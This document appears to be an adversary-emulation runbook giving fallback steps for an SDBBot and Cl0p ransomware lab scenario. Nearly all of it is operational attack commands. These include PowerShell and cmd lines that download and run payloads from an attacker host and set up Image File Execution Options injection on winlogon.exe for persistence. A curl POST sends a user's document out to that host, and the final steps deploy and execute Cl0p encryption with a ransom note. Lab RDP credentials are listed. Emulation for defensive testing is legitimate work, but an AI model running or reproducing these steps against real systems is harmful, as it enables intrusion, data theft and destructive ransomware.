# This is the ALTERNATIVE instruction set for the Scenario

Legend of symbols:

* :bulb: - callout notes
* :heavy_exclamation_mark: - extremely important note
* :arrow_right: - Switching to another session
* :o: - Sign out of something
* :biohazard: - Procedure for a given step

This document provides alternative steps to perform if a particular portion of a step fails to execute.
Due to the nature of the scenario and its components, not every part has a
corresponding alternative
step, and most alternative steps will sacrifice certain parts of the scenario,
in particular the emulated TTPs.

## Step 1 - Persistence

### SDBBot Installer Failed to Write Shellcode Blob to Registry

#### :biohazard: Tier 1 Procedures

* If the SDBBot installer failed to save the shellcode blob to the registry key `HKLM:\SOFTWARE\Microsoft\skw`,
search for PowerShell and right-click to Run As Administrator. Then run the
following commands:

  ```PowerShell
  $blob = (curl http://curse-breaker.org/files/shellcode-blob.bin).Content;
  if (!$blob) {
    Write-Host "[ERROR] Failed to fetch blob for IFEO registry write."
  } else {
    New-Item -Path "HKLM:\SOFTWARE\Microsoft\skw" -Force;
    Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\skw" -Name "d" -Type Binary -Value ([byte[]]$blob);
  }
  ```

### SDBBot Installer Failed to Write Symlink in SYSTEM32

#### :biohazard: Tier 1 Procedures

* If the SDBBot installer failed to create the symlink file
`C:\Windows\System32\msverload.dll` for the loader DLL,
search for PowerShell and right-click to Run As Administrator, or use an
existing Adminstrator PowerShell window if available.
Then run the following commands:

  ```PowerShell
  cmd /c "mklink C:\Windows\System32\msverload.dll C:\Windows\Temp\tmp8AB2.tmp"
  ```

### SDBBot Installer Failed to Set Up Image File Execution Options Injection

#### :biohazard: Tier 1 Procedures

* If the SDBBot installer failed to perform the registry writes to set up Image
File Execution Options Injection for `winlogon.exe`,
search for PowerShell and right-click to Run As Administrator, or use an
existing Adminstrator PowerShell window if available.
Then run the following commands:

  ```PowerShell
  New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" -Force;
  New-Item -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe\0" -Force;
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe" -Name "UseFilter" -Value 0x1;
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe\0" -Name "VerifierDlls" -Value "msverload.dll";
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe\0" -Name "GlobalFlag" -Value 0x100;
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe\0" -Name "VerifierFlags" -Value 0x80000000;
  Set-ItemProperty -Path "HKLM:\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\winlogon.exe\0" -Name "FilterFullPath" -Value "C:\Windows\System32\winlogon.exe";
  ```

### SDBBot Installer Failed to Drop Loader DLL to Disk

#### :biohazard: Tier 1 Procedures

* If the SDBBot installer failed to drop the loader DLL to disk at `C:\Windows\Temp\tmp8AB2.tmp`,
search for PowerShell and right-click to Run As Administrator, or use an
existing Adminstrator PowerShell window if available.
Then run the following commands:

  ```PowerShell
  curl http://curse-breaker.org/files/msverload.dll -OutFile C:\Windows\Temp\tmp8AB2.tmp
  ```

### SDBBot Loader DLL Failed to Execute

#### :biohazard: Tier 1 Procedures

* If the SDBBot loader DLL failed to launch or if the image file execution
options injection failed in any other way,
search for PowerShell and right-click to Run As Administrator, or use an
existing Adminstrator PowerShell window if available.
Then run the following commands:

  ```PowerShell
  curl http://curse-breaker.org/files/msverload_alt.dll -OutFile C:\Windows\Temp\msverload_alt.dll
  rundll32.exe C:\Windows\Temp\msverload_alt.dll,entry_point
  ```

* :arrow_right: Return to the Kali attack host corsair (223.246.0.70)
* Confirm C2 registration of the SDBbot RAT

## Step 2 - Command and Control

### Failed to Establish SDBBOT Rat Session

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `diagonalley (10.55.4.21)` (if
not already open)

  | Username | Password |
  | -------- | -------- |
  | encryptpotter.net\griphook | Feral-Studs |

* Search for Command Prompt and right-click to Run As Administrator then copy
and paste all the commands below. Hit enter to run the commands.

  ```cmd
  curl --output "C:\\Windows\\Temp\\rat.dll" http://curse-breaker.org/files/rat.dll
  curl --output "C:\\Windows\\Temp\\rtr.exe" http://curse-breaker.org/files/rat-runner.exe
  C:\Windows\Temp\rtr.exe
  ```

### No SDBBot to execute commands or failed to execute commands via SDBBOT

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `diagonalley (10.55.4.21)` (if
not already open)

  | Username | Password |
  | -------- | -------- |
  | encryptpotter.net\griphook | Feral-Studs |

* Search for Command Prompt and right-click to Run As Administrator then copy
and paste all the commands below. Hit enter to run the commands.

  ```cmd
  whoami /all
  whoami /fqdn
  hostname
  systeminfo
  reg query "HKCU\Control Panel\International\Geo"
  ```

## Step 3 - Discovery and Exfiltration

### No SDBBot to execute commands

#### :biohazard: Tier 1 Procedures

* In the elevated Command Prompt, execute the following command to enumerate a
user directory:

  ```cmd
  dir C:\users
  ```

* Execute the following command to exfiltrate the file:

  ```cmd
  curl -X POST http://curse-breaker.org/uploads -H "filename:Findings_reZGaJ.doc" --data-binary "@C:\Users\griphook\Desktop\Findings_reZGaJ.doc"
  ```

## Step 4 - Defense Evasion and Impact

### Failed to download Cl0p or no SDBBot to download/execute cl0p

#### :biohazard: Tier 1 Procedures

* :arrow_right: Initiate an RDP session to `diagonalley (10.55.4.21)` (if
not already open)

  | Username | Password |
  | -------- | -------- |
  | encryptpotter.net\griphook | Feral-Studs |

* Search for Command Prompt and right-click to Run As Administrator then copy
and paste all the commands below. Hit enter to run the commands.

  ```cmd
  curl --output C:\Windows\System32\SysMonitor.exe http://curse-breaker.org/files/main.exe
  C:\Windows\System32\SysMonitor.exe
  ```

### Cl0p Fails to Execute

#### :biohazard: Tier 1 Procedures

* Open an elevated command prompt and run the following command to download the
alternative Cl0p batch script to `diagonalley (10.55.4.21)`:

  ```cmd
  curl --output C:\Windows\System32\SysMonitor.bat http://curse-breaker.org/files/cl0p.bat
  ```

* Enter the following command to download the minimal Cl0p encryption
executable to `diagonalley (10.55.4.21)`:

  ```cmd
  curl --output C:\Windows\System32\SysMonitor.minimal.exe http://curse-breaker.org/files/minimal.exe
  ```

* Enter the following command to execute the alternative batch script:

  ```cmd
  C:\Windows\System32\SysMonitor.bat C:\Windows\System32\SysMonitor.minimal.exe
  ```

* Verify that the hosts were encrypted by checking the presence of files with
the `.C_I0p` extension and the `Readme!_CI0P!.txt` ransom note in directories.

* Verify activity failure or success by looking at terminal output and at the
`C:\Windows\temp\cl0p.bat.log` log file on affected hosts.
